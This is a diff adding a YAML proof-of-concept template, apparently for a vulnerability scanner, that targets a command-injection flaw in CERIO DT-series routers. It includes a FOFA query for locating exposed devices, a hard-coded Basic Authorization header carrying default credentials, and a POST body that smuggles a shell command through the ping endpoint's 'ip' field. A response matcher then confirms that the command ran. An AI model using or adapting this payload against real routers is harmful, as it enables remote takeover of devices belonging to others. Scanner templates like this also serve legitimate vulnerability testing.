@@ -1,0 +1,27 @@
+id: poc-yaml-cerio-dt-router-rce
+info:
+  name: CERIO DT系列路由器 远程代码执行漏洞
+  severity: high
+  tags:
+  - rce
+  finger: CERIO
+  fofa: title="DT-100G-N" || title="DT-300N" || title="DT-100G" || title="AMR-3204G"
+    || title="WMR-200N"
+requests:
+- method: POST
+  path: /cgi-bin/Save.cgi?cgi=PING
+  headers:
+    Authorization: Basic b3BlcmF0b3I6MTIzNA==
+    Content-Type: application/x-www-form-urlencoded
+  data: pid=2061&ip=127.0.0.1;id&times=1
+  expression: 'status_code == 200 &&
+
+    contains(body,"uid=") &&
+
+    contains(body,"gid=") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
